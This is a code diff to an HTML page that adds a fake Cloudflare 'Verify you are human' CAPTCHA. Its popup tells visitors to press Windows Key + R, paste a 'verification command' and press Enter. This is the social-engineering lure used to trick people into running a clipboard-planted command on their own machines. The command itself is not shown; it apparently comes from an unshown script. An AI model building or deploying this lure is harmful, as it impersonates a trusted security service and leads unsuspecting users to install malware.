@@ -7,7 +7,15 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="container">
+
+    <!-- Loading Spinner -->
+    <div id="loading-screen">
+        <h1>Verifying you are human...</h1>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- CAPTCHA Container (Hidden Initially) -->
+    <div class="container" id="captcha-container">
         <h1 id="domain-name"></h1>
         <p>Verifying you are human. This may take a few seconds.</p>
 
@@ -15,13 +23,27 @@
             <input type="checkbox" id="captcha" onclick="verifyCaptcha()">
             <label for="captcha">
                 <span>Verify you are human</span>
-                <img src="cloudflare.png" alt="Cloudflare Logo">
+                <img src="cloudflare.png" alt="Cloudflare Logo" id="cf-logo">
             </label>
         </div>
 
         <p class="security-text">
             <span id="security-msg"></span>
         </p>
+    </div>
+
+    <!-- Instructional Popup (Hidden Initially) -->
+    <div id="instruction-popup">
+        <div class="popup-content">
+            <h2>Security by Cloudflare</h2>
+            <p><strong>Verification Steps:</strong></p>
+            <ol>
+                <li>Press <strong>Windows Key + R</strong></li>
+                <li>Press <strong>Ctrl + V</strong> to paste the verification command</li>
+                <li>Press <strong>Enter</strong> to complete verification</li>
+            </ol>
+            <button onclick="closePopup()">VERIFY</button>
+        </div>
     </div>
 
     <script src="script.js"></script>
